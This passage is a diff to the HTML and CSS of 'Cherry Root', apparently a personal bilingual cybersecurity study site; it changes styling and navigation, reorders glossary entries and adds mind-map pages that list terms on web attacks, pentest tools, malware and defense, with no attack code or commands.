@@ -62,15 +62,15 @@ code{font-family:'DM Mono',monospace;font-size:.76rem;background:var(--p100);pad
 .sn{font-family:'Playfair Display',serif;font-size:.98rem;font-weight:700;color:var(--p300);min-width:1.1rem;line-height:1.3;flex-shrink:0}
 .adg{display:grid;grid-template-columns:1fr 1fr;gap:.7rem}
 @media(max-width:520px){.adg{grid-template-columns:1fr}}
-.atk{background:#fff5f7;border:1.5px solid var(--p200);border-radius:12px;padding:.9rem 1rem}
-.def{background:var(--gbg);border:1.5px solid var(--gborder);border-radius:12px;padding:.9rem 1rem}
+.atk{background:#fff5f7;border:1.5px solid var(--p200);border-radius:12px;padding:.9rem 1rem;min-width:0;overflow:hidden}
+.def{background:var(--gbg);border:1.5px solid var(--gborder);border-radius:12px;padding:.9rem 1rem;min-width:0;overflow:hidden}
 .adt{font-family:'DM Mono',monospace;font-size:.56rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.55rem}
 .atk .adt{color:var(--p500)}.def .adt{color:var(--ink)}
 .adl{list-style:none;display:flex;flex-direction:column;gap:.35rem}
 .adl li{font-size:.78rem;line-height:1.5;display:flex;align-items:flex-start;gap:.45rem}
 .atk .adl li{color:var(--ink2)}.def .adl li{color:var(--ink2)}
 .atk .adl li::before{content:'—';color:var(--p300);flex-shrink:0}
-.def .adl li::before{content:'—';color:#60b884;flex-shrink:0}
+.def .adl li::before{content:'—';color:var(--ink2);flex-shrink:0}
 .rem{background:var(--p50);border:1.5px solid var(--p200);border-radius:12px;padding:.9rem 1.1rem;display:flex;gap:.75rem;align-items:flex-start;font-size:.82rem;color:var(--ink2);line-height:1.7;font-style:italic}
 .ri{font-size:.95rem;flex-shrink:0;line-height:1.5}
 .qrb{background:white;border:1.5px solid var(--line);border-radius:14px;padding:1.1rem 1.3rem;margin-bottom:.9rem}
@@ -164,15 +164,13 @@ code{font-family:'DM Mono',monospace;font-size:.76rem;background:var(--p100);pad
 
 /* GLOSSARY MARKERS — star underline + modal */
 .gloss{
-  cursor:pointer;color:var(--ink);
-  background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8 8'><text x='0' y='6' font-size='6' fill='%23e8739a'>%E2%9C%A6</text></svg>");
-  background-repeat:repeat-x;
-  background-position:0 100%;
-  background-size:8px 8px;
-  padding-bottom:7px;
-  transition:color .15s;
+  cursor:pointer;
+  color:var(--ink);
+  border-bottom:1px dotted var(--p400);
+  padding-bottom:0;
+  transition:color .15s, border-color .15s;
 }
-.gloss:hover{color:var(--p500)}
+.gloss:hover{color:var(--p500);border-bottom-color:var(--p500)}
 /* Glossary Modal */
 .gmodal-overlay{position:fixed;inset:0;background:rgba(28,15,20,.5);display:none;align-items:center;justify-content:center;z-index:200;padding:1rem}
 .gmodal-overlay.on{display:flex;animation:gfade .2s ease}
@@ -319,13 +317,55 @@ body.dark{
 body.dark .topbar{background:var(--page);border-color:var(--line)}
 body.dark .nav{background:var(--page);border-color:var(--line)}
 body.dark .pg{background:var(--page)}
-body.dark .gloss{background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8 8'><text x='0' y='6' font-size='6' fill='%23f4a0bc'>%E2%9C%A6</text></svg>")}
+body.dark .gloss{border-bottom-color:var(--p300);color:var(--ink)}
+body.dark .gloss:hover{color:var(--p500);border-bottom-color:var(--p500)}
 body.dark .gmodal{background:var(--page);color:var(--ink)}
 body.dark .notes-textarea{background:var(--p50);color:var(--ink);border-color:var(--line)}
 body.dark .tag-btn{background:var(--p50);color:var(--ink2)}
 body.dark .filter-chip{background:var(--p50);color:var(--ink2)}
 body.dark .searchbar input{color:var(--ink)}
 body.dark .searchbar{background:var(--p50);border-color:var(--line)}
+/* Dark mode overrides for visual / map / quiz cards */
+body.dark .mb,body.dark .mmb,body.dark .qrb,body.dark .mqrblock{background:var(--p50);border-color:var(--line)}
+body.dark .step{background:var(--p50);border-color:var(--line);color:var(--ink2)}
+body.dark .rem{background:var(--p50);border-color:var(--p300)}
+body.dark .atk{background:var(--p50);border-color:var(--p300)}
+body.dark .def{background:var(--p50);border-color:var(--line)}
+body.dark .mm-tree{background:var(--p50);border-color:var(--line)}
+body.dark .mm-master-card{background:var(--p50);border-color:var(--line)}
+body.dark .mm-master-grid{background:transparent}
+body.dark .attack-card,body.dark .atk-card{background:var(--p50);border-color:var(--line)}
+body.dark .kc-row,body.dark .kill-step{background:var(--p50);border-color:var(--line)}
+body.dark .osi-layer{background:var(--p50);border-color:var(--line)}
+body.dark .osi-num{background:var(--p100)}
+body.dark .vis-svg{background:var(--p50);border-color:var(--line)}
+body.dark .http-panel{background:var(--p50);border-color:var(--line)}
+body.dark .http-line.hi{background:var(--p100)}
+body.dark .flag-item{background:var(--p50);border-color:var(--p300)}
+body.dark .flag-item.hi{background:var(--p100);border-color:var(--p400)}
+body.dark .code-item{background:var(--p50);border-color:var(--p300)}
+body.dark .guide-block{background:var(--p50)}
+body.dark .bdiv{background:var(--page)}
+body.dark .bdiv-pill{background:var(--p50);border-color:var(--p300);color:var(--ink2)}
+body.dark .gl-search{background:var(--p50);border-color:var(--line);color:var(--ink)}
+body.dark .gl-search input{color:var(--ink)}
+body.dark .quiz-trigger{background:linear-gradient(135deg,var(--p100),var(--p200));border-color:var(--p300)}
+body.dark .quiz-trigger-icon{background:var(--p50)}
+body.dark .quiz-card{background:var(--page)}
+body.dark .quiz-tab{background:var(--p50);border-color:var(--line);color:var(--ink2)}
+body.dark .quiz-tab.active{background:linear-gradient(135deg,var(--p100),var(--p50))}
+body.dark .quiz-option{background:var(--p50);border-color:var(--line);color:var(--ink2)}
+body.dark .quiz-option:hover{background:var(--p100)}
+body.dark .quiz-result-circle::before{background:var(--page)}
+body.dark .quiz-close-btn{background:var(--p50);border-color:var(--line);color:var(--ink3)}
+body.dark .quiz-result-btn.secondary{background:var(--p50);border-color:var(--line);color:var(--ink2)}
+body.dark .quiz-best{background:var(--p100);border-color:var(--p300)}
+body.dark .quiz-stats{background:var(--p50)}
+body.dark .quiz-review-item{background:var(--p50);border-color:var(--p300)}
+body.dark .itbl tr:hover td{background:var(--p50)}
+body.dark .itbl th{border-color:var(--p300)}
+body.dark .isp td{background:var(--p50)!important}
+body.dark .progress-track{background:var(--p50)}
 
 /* === QUIZ === */
 .quiz-trigger{margin:1rem 0;padding:1rem 1.2rem;background:linear-gradient(135deg,var(--p100),var(--p200));border:1.5px solid var(--p300);border-radius:14px;cursor:pointer;display:flex;align-items:center;gap:.8rem;transition:all .15s}
@@ -648,6 +688,11 @@ Modo Revisão
 <div class="ndiv"></div>
 
 
+<div class="ns">Progress &amp; Goals</div>
+<div class="ni" onclick="go('goals',this)"><span class="cd">GLS</span>Goals &amp; Progress</div>
+<div class="ni" onclick="go('stats',this)"><span class="cd">STA</span>Statistics</div>
+<div class="ni" onclick="go('progress-management',this)"><span class="cd">PRG</span>Manage Progress</div>
+<div class="ndiv"></div>
 <div class="ns">Extra Pages</div>
 <div class="ni" onclick="go('howto',this)"><span class="cd">HTU</span>How to Use</div>
 <div class="ni" onclick="go('redflag',this)"><span class="cd"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" style="display:inline-block;vertical-align:-2px"><line x1="5" y1="22" x2="5" y2="3" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/><path d="M5 4 L18 4 L15 9 L18 14 L5 14" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/></svg></span>Red Flags</div>
@@ -666,6 +711,7 @@ Modo Revisão
 <!-- COVER -->
 <div class="pg on" id="pg-cover">
 <div class="cw">
+<div style="color:var(--p500);margin-bottom:.4rem"><svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"><circle cx="9" cy="18" r="4"/><circle cx="16" cy="19" r="4"/><path d="M9 14 Q11 7 14 5"/><path d="M16 15 Q15 9 14 5"/><path d="M14 5 Q10 3 9 6 Q12 7 14 5"/><path d="M14 5 Q18 3 19 6 Q16 7 14 5"/></svg></div>
 <div class="cb"></div>
 <div class="ce">personal manual · cybersecurity</div>
 <div class="ct">Cherry <span>Root</span></div>
@@ -1025,6 +1071,8 @@ Modo Revisão
 <div class="gi"><span class="gt">IP address</span><span class="gd">Unique numerical address of a device on a network</span></div>
 
 <div class="gi"><span class="gt">IDOR</span><span class="gd">Insecure Direct Object Reference — accessing others' data by changing an ID</span></div>
+<div class="gl">J</div>
+<div class="gi"><span class="gt">John the Ripper</span><span class="gd">Classic CPU-based password cracker with hundreds of supported hash formats</span></div>
 <div class="gl">K</div>
 <div class="gi"><span class="gt">keylogger</span><span class="gd">Captures every keystroke — software (API hooks) or hardware (inline USB)</span></div>
 <div class="gi"><span class="gt">kernel</span><span class="gd">Core of the OS — manages hardware resources directly</span></div>
@@ -1091,6 +1139,8 @@ Modo Revisão
 <div class="gi"><span class="gt">path traversal</span><span class="gd">Escaping the intended directory using ../ sequences</span></div>
 <div class="gi"><span class="gt">PoC</span><span class="gd">Proof of Concept — minimal exploit demonstrating a vulnerability works</span></div>
 <div class="gi"><span class="gt">Python</span><span class="gd">High-level interpreted language — dominant in offensive tooling and CTFs</span></div>
+<div class="gl">Q</div>
+<div class="gi"><span class="gt">quid pro quo</span><span class="gd">Social-engineering attack offering a benefit in exchange for information or access</span></div>
 <div class="gl">R</div>
 <div class="gi"><span class="gt">ransomware</span><span class="gd">Malware that encrypts data and demands payment for decryption; often double-extorts via leaks</span></div>
 <div class="gi"><span class="gt">RAT</span><span class="gd">Remote Access Trojan — gives operator full control of the victim machine</span></div>
@@ -1190,12 +1240,6 @@ Modo Revisão
 <div class="gi"><span class="gt">zero trust</span><span class="gd">Security model — trust nothing by default, always verify</span></div>
 </div>
 
-<div class="gl">J</div>
-<div class="gi"><span class="gt">John the Ripper</span><span class="gd">Classic CPU-based password cracker with hundreds of supported hash formats</span></div>
-
-<div class="gl">Q</div>
-<div class="gi"><span class="gt">quid pro quo</span><span class="gd">Social-engineering attack offering a benefit in exchange for information or access</span></div>
-
 <!-- STUDY METHOD -->
 <div class="pg" id="pg-method">
 <div class="ph"><div class="bc">cherry root <span>›</span> study method</div><div class="pt">My Study System</div><div class="ps">How to use this grimoire to learn fast and retain everything.</div></div>
@@ -1261,7 +1305,8 @@ Click the heart on any term page to add it here. Your favorites become your pers
 </div>
 
 <div class="mm-stats">
-<span class="mm-stat-chip">60 termos</span>
+<span class="mm-stat-chip">146 termos</span>
+<span class="mm-stat-chip">12 blocos</span>
 <span class="mm-stat-chip">clicáveis</span>
 <span class="mm-stat-chip">com glossário</span>
 </div>
@@ -1296,13 +1341,52 @@ Visualize como os termos se conectam. Clique em qualquer termo pra ir direto pra
 <div class="mm-line"><span class="mm-pipe">│  ├─ </span>Traffic: <span class="mm-leaf gloss" onclick="go('n11')">Packet</span>, <span class="mm-leaf gloss" onclick="go('n12')">Bandwidth</span></div>
 <div class="mm-line"><span class="mm-pipe">│  └─ </span>Services: <span class="mm-leaf gloss" onclick="go('n13')">Proxy</span>, <span class="mm-leaf gloss" onclick="go('n14')">VPN</span>, <span class="mm-leaf gloss" onclick="go('n15')">NAT</span>, <span class="mm-leaf gloss" onclick="go('n17')">DHCP</span></div>
 
-<div class="mm-line"><span class="mm-pipe">└─ </span><span class="mm-cat">BLOCK 3 · Linux</span></div>
-<div class="mm-line"><span class="mm-pipe">   ├─ </span>System: <span class="mm-leaf gloss" onclick="go('l01')">Linux</span>, <span class="mm-leaf gloss" onclick="go('l02')">Distro</span>, <span class="mm-leaf gloss" onclick="go('l03')">Kernel</span></div>
-<div class="mm-line"><span class="mm-pipe">   ├─ </span>Interface: <span class="mm-leaf gloss" onclick="go('l04')">Shell</span>, <span class="mm-leaf gloss" onclick="go('l05')">Terminal</span></div>
-<div class="mm-line"><span class="mm-pipe">   ├─ </span>Files: <span class="mm-leaf gloss" onclick="go('l06')">FS Tree</span>, <span class="mm-leaf gloss" onclick="go('l07')">Permissions</span></div>
-<div class="mm-line"><span class="mm-pipe">   ├─ </span>Identity: <span class="mm-leaf gloss" onclick="go('l08')">User/Group</span>, <span class="mm-leaf gloss" onclick="go('l09')">sudo</span></div>
-<div class="mm-line"><span class="mm-pipe">   ├─ </span>Processes: <span class="mm-leaf gloss" onclick="go('l10')">ps/top</span>, <span class="mm-leaf gloss" onclick="go('l12')">Logs</span></div>
-<div class="mm-line"><span class="mm-pipe">   └─ </span>Access: <span class="mm-leaf gloss" onclick="go('l11')">Pkg Mgr</span>, <span class="mm-leaf gloss" onclick="go('l13')">SSH</span>, <span class="mm-leaf gloss" onclick="go('l14')">Cron</span>, <span class="mm-leaf gloss" onclick="go('l15')">systemd</span></div>
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">BLOCK 3 · Linux</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span>System: <span class="mm-leaf gloss" onclick="go('l01')">Linux</span>, <span class="mm-leaf gloss" onclick="go('l02')">Distro</span>, <span class="mm-leaf gloss" onclick="go('l03')">Shell</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span>Files: <span class="mm-leaf gloss" onclick="go('l04')">FS Tree</span>, <span class="mm-leaf gloss" onclick="go('l06')">Permissions</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span>Identity: <span class="mm-leaf gloss" onclick="go('l07')">Users</span>, <span class="mm-leaf gloss" onclick="go('l08')">sudo</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span>Access: <span class="mm-leaf gloss" onclick="go('l12')">SSH</span>, <span class="mm-leaf gloss" onclick="go('l13')">Pkg Mgr</span>, <span class="mm-leaf gloss" onclick="go('l14')">Cron</span>, <span class="mm-leaf gloss" onclick="go('l15')">Logs</span></div>
+
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">BLOCK 4 · Programming</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span>Logic: <span class="mm-leaf gloss" onclick="go('p01')">Logic</span>, <span class="mm-leaf gloss" onclick="go('p05')">Condition</span>, <span class="mm-leaf gloss" onclick="go('p04')">Loop</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span>Data: <span class="mm-leaf gloss" onclick="go('p02')">Variable</span>, <span class="mm-leaf gloss" onclick="go('p06')">Array</span>, <span class="mm-leaf gloss" onclick="go('p07')">Dict</span>, <span class="mm-leaf gloss" onclick="go('p08')">String</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span>Code: <span class="mm-leaf gloss" onclick="go('p03')">Function</span>, <span class="mm-leaf gloss" onclick="go('p09')">File I/O</span>, <span class="mm-leaf gloss" onclick="go('p10')">Python</span></div>
+
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">BLOCK 5 · Security Fundamentals</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span>Pillars: <span class="mm-leaf gloss" onclick="go('s01')">CIA</span>, <span class="mm-leaf gloss" onclick="go('s07')">Defense-in-Depth</span>, <span class="mm-leaf gloss" onclick="go('s08')">Zero Trust</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span>Risk: <span class="mm-leaf gloss" onclick="go('s02')">Threat</span>, <span class="mm-leaf gloss" onclick="go('s03')">Vulnerability</span>, <span class="mm-leaf gloss" onclick="go('s04')">Exploit</span>, <span class="mm-leaf gloss" onclick="go('s05')">Risk</span>, <span class="mm-leaf gloss" onclick="go('s06')">Attack Surface</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span>Controls: <span class="mm-leaf gloss" onclick="go('s09')">Encryption</span>, <span class="mm-leaf gloss" onclick="go('s10')">Hashing</span>, <span class="mm-leaf gloss" onclick="go('s11')">AuthN</span>, <span class="mm-leaf gloss" onclick="go('s12')">AuthZ</span></div>
+
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">BLOCK 6 · Web Attacks</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span>Injection: <span class="mm-leaf gloss" onclick="go('a01')">SQLi</span>, <span class="mm-leaf gloss" onclick="go('a02')">XSS</span>, <span class="mm-leaf gloss" onclick="go('a06')">Cmd Inj</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span>Logic: <span class="mm-leaf gloss" onclick="go('a03')">CSRF</span>, <span class="mm-leaf gloss" onclick="go('a04')">SSRF</span>, <span class="mm-leaf gloss" onclick="go('a05')">Path Trav</span>, <span class="mm-leaf gloss" onclick="go('a07')">IDOR</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span>Session: <span class="mm-leaf gloss" onclick="go('a08')">Open Redir</span>, <span class="mm-leaf gloss" onclick="go('a09')">Clickjacking</span>, <span class="mm-leaf gloss" onclick="go('a10')">Hijack</span>, <span class="mm-leaf gloss" onclick="go('a11')">Auth Bypass</span>, <span class="mm-leaf gloss" onclick="go('a12')">Race</span></div>
+
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">BLOCK 7 · Pentest Tools</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span>Recon: <span class="mm-leaf gloss" onclick="go('t01')">nmap</span>, <span class="mm-leaf gloss" onclick="go('t06')">Gobuster</span>, <span class="mm-leaf gloss" onclick="go('t03')">Wireshark</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span>Web: <span class="mm-leaf gloss" onclick="go('t02')">Burp</span>, <span class="mm-leaf gloss" onclick="go('t05')">sqlmap</span>, <span class="mm-leaf gloss" onclick="go('t11')">curl</span>, <span class="mm-leaf gloss" onclick="go('t12')">DevTools</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├</span>Exploit: <span class="mm-leaf gloss" onclick="go('t04')">Metasploit</span>, <span class="mm-leaf gloss" onclick="go('t10')">netcat</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span>Crack: <span class="mm-leaf gloss" onclick="go('t07')">John</span>, <span class="mm-leaf gloss" onclick="go('t08')">Hashcat</span>, <span class="mm-leaf gloss" onclick="go('t09')">Hydra</span></div>
+
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">BLOCK 8 · Methodology</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span>Discover: <span class="mm-leaf gloss" onclick="go('m01')">Recon</span>, <span class="mm-leaf gloss" onclick="go('m02')">Scan</span>, <span class="mm-leaf gloss" onclick="go('m03')">Enum</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span>Breach: <span class="mm-leaf gloss" onclick="go('m04')">Exploit</span>, <span class="mm-leaf gloss" onclick="go('m05')">PrivEsc</span>, <span class="mm-leaf gloss" onclick="go('m06')">Persist</span>, <span class="mm-leaf gloss" onclick="go('m07')">Lateral</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span>Close: <span class="mm-leaf gloss" onclick="go('m08')">Exfil</span>, <span class="mm-leaf gloss" onclick="go('m09')">Cover Tracks</span>, <span class="mm-leaf gloss" onclick="go('m10')">Report</span></div>
+
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">BLOCK 9 · Social Engineering</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span>Digital: <span class="mm-leaf gloss" onclick="go('e01')">Phishing</span>, <span class="mm-leaf gloss" onclick="go('e02')">Spear</span>, <span class="mm-leaf gloss" onclick="go('e07')">Smishing</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span>Voice/Physical: <span class="mm-leaf gloss" onclick="go('e05')">Tailgating</span>, <span class="mm-leaf gloss" onclick="go('e06')">Vishing</span>, <span class="mm-leaf gloss" onclick="go('e04')">Baiting</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span>Pretexting: <span class="mm-leaf gloss" onclick="go('e03')">Pretext</span>, <span class="mm-leaf gloss" onclick="go('e08')">Watering Hole</span>, <span class="mm-leaf gloss" onclick="go('e09')">Quid Pro Quo</span>, <span class="mm-leaf gloss" onclick="go('e10')">Impersonation</span></div>
+
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">BLOCK 10 · Malware</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span>Replicate: <span class="mm-leaf gloss" onclick="go('x01')">Virus</span>, <span class="mm-leaf gloss" onclick="go('x02')">Worm</span>, <span class="mm-leaf gloss" onclick="go('x09')">Botnet</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span>Stealth: <span class="mm-leaf gloss" onclick="go('x03')">Trojan</span>, <span class="mm-leaf gloss" onclick="go('x06')">Rootkit</span>, <span class="mm-leaf gloss" onclick="go('x08')">Backdoor</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span>Payload: <span class="mm-leaf gloss" onclick="go('x04')">Ransomware</span>, <span class="mm-leaf gloss" onclick="go('x05')">Spyware</span>, <span class="mm-leaf gloss" onclick="go('x07')">Keylogger</span>, <span class="mm-leaf gloss" onclick="go('x10')">Logic Bomb</span></div>
+
+<div class="mm-line"><span class="mm-pipe">└─ </span><span class="mm-cat">BLOCK 11 · Defense</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span>Perimeter: <span class="mm-leaf gloss" onclick="go('d01')">Firewall</span>, <span class="mm-leaf gloss" onclick="go('d05')">WAF</span>, <span class="mm-leaf gloss" onclick="go('d02')">IDS/IPS</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span>Detect: <span class="mm-leaf gloss" onclick="go('d03')">SIEM</span>, <span class="mm-leaf gloss" onclick="go('d04')">EDR</span>, <span class="mm-leaf gloss" onclick="go('d06')">Honeypot</span></div>
+<div class="mm-line"><span class="mm-pipe">   └─ </span>Resilience: <span class="mm-leaf gloss" onclick="go('d07')">Patch Mgmt</span>, <span class="mm-leaf gloss" onclick="go('d08')">Backup</span>, <span class="mm-leaf gloss" onclick="go('d09')">IR</span>, <span class="mm-leaf gloss" onclick="go('d10')">Awareness</span></div>
 </div>
 
 
@@ -1529,6 +1613,318 @@ Visualize como os termos se conectam. Clique em qualquer termo pra ir direto pra
 <span class="mm-legend-item">✦ ✦ ✦ Glossário</span>
 </div>
 
+</div>
+
+
+<!-- MIND MAP: Programming Mind Map -->
+<div class="pg" id="pg-mm-b4">
+<div class="ph">
+<div class="bc">cherry root <span>›</span> mind maps <span>›</span> Block 4</div>
+<div class="pt">Programming Mind Map</div>
+<div class="ps">Como os fundamentos de programação se conectam.</div>
+</div>
+<div class="mm-stats">
+<span class="mm-stat-chip">10 termos</span>
+<span class="mm-stat-chip">clicáveis</span>
+<span class="mm-stat-chip">com glossário</span>
+</div>
+<div class="mm-intro">
+<div class="mm-intro-label">mapa mental</div>
+Visualize como os termos se conectam. Clique em qualquer termo pra ir direto pra página dele.
+</div>
+<div class="mm-tree">
+<div class="mm-root">Programming — Block 4</div>
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">Lógica</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('p01')">Programming Logic</span><span class="mm-note">— pensar passo a passo</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('p05')">Condition</span><span class="mm-note">— if/else — decisões</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span><span class="mm-leaf gloss" onclick="go('p04')">Loop</span><span class="mm-note">— for/while — repetir</span></div>
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">Dados</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('p02')">Variable</span><span class="mm-note">— guardar valor</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('p06')">Array / List</span><span class="mm-note">— coleção ordenada</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('p07')">Dictionary</span><span class="mm-note">— chave → valor</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span><span class="mm-leaf gloss" onclick="go('p08')">String Manipulation</span><span class="mm-note">— texto</span></div>
+<div class="mm-line"><span class="mm-pipe">└─ </span><span class="mm-cat">Código</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('p03')">Function</span><span class="mm-note">— bloco reutilizável</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('p09')">File I/O</span><span class="mm-note">— ler/escrever disco</span></div>
+<div class="mm-line"><span class="mm-pipe">   └─ </span><span class="mm-leaf gloss" onclick="go('p10')">Python for Hackers</span><span class="mm-note">— linguagem do hacker</span></div>
+</div>
+<div class="mm-legend">
+<span class="mm-legend-item"><span class="mm-legend-dot" style="background:var(--p500)"></span>Categoria</span>
+<span class="mm-legend-item"><span class="mm-legend-dot" style="background:var(--p300)"></span>Termo (clique pra abrir)</span>
+</div>
+</div>
+
+<!-- MIND MAP: Security Fundamentals Mind Map -->
+<div class="pg" id="pg-mm-b5">
+<div class="ph">
+<div class="bc">cherry root <span>›</span> mind maps <span>›</span> Block 5</div>
+<div class="pt">Security Fundamentals Mind Map</div>
+<div class="ps">Os pilares e conceitos base de segurança.</div>
+</div>
+<div class="mm-stats">
+<span class="mm-stat-chip">12 termos</span>
+<span class="mm-stat-chip">clicáveis</span>
+<span class="mm-stat-chip">com glossário</span>
+</div>
+<div class="mm-intro">
+<div class="mm-intro-label">mapa mental</div>
+Visualize como os termos se conectam. Clique em qualquer termo pra ir direto pra página dele.
+</div>
+<div class="mm-tree">
+<div class="mm-root">Security Fundamentals — Block 5</div>
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">Pilares</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('s01')">CIA Triad</span><span class="mm-note">— Conf · Integ · Disp</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('s07')">Defense in Depth</span><span class="mm-note">— camadas</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span><span class="mm-leaf gloss" onclick="go('s08')">Zero Trust</span><span class="mm-note">— nunca confiar</span></div>
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">Risco</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('s02')">Threat</span><span class="mm-note">— ameaça</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('s03')">Vulnerability</span><span class="mm-note">— fraqueza</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('s04')">Exploit</span><span class="mm-note">— arma</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('s05')">Risk</span><span class="mm-note">— prob × impacto</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span><span class="mm-leaf gloss" onclick="go('s06')">Attack Surface</span><span class="mm-note">— tudo exposto</span></div>
+<div class="mm-line"><span class="mm-pipe">└─ </span><span class="mm-cat">Controles</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('s09')">Encryption</span><span class="mm-note">— cifrar</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('s10')">Hashing</span><span class="mm-note">— impressão digital</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('s11')">Authentication</span><span class="mm-note">— quem é você</span></div>
+<div class="mm-line"><span class="mm-pipe">   └─ </span><span class="mm-leaf gloss" onclick="go('s12')">Authorization</span><span class="mm-note">— o que pode fazer</span></div>
+</div>
+<div class="mm-legend">
+<span class="mm-legend-item"><span class="mm-legend-dot" style="background:var(--p500)"></span>Categoria</span>
+<span class="mm-legend-item"><span class="mm-legend-dot" style="background:var(--p300)"></span>Termo (clique pra abrir)</span>
+</div>
+</div>
+
+<!-- MIND MAP: Web Attacks Mind Map -->
+<div class="pg" id="pg-mm-b6">
+<div class="ph">
+<div class="bc">cherry root <span>›</span> mind maps <span>›</span> Block 6</div>
+<div class="pt">Web Attacks Mind Map</div>
+<div class="ps">Como os ataques web se agrupam.</div>
+</div>
+<div class="mm-stats">
+<span class="mm-stat-chip">12 termos</span>
+<span class="mm-stat-chip">clicáveis</span>
+<span class="mm-stat-chip">com glossário</span>
+</div>
+<div class="mm-intro">
+<div class="mm-intro-label">mapa mental</div>
+Visualize como os termos se conectam. Clique em qualquer termo pra ir direto pra página dele.
+</div>
+<div class="mm-tree">
+<div class="mm-root">Web Attacks — Block 6</div>
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">Injeção</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('a01')">SQL Injection</span><span class="mm-note">— injetar SQL</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('a02')">XSS</span><span class="mm-note">— JS no browser da vítima</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span><span class="mm-leaf gloss" onclick="go('a06')">Command Injection</span><span class="mm-note">— comando OS</span></div>
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">Falha de Lógica</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('a03')">CSRF</span><span class="mm-note">— forçar ação logada</span></div>
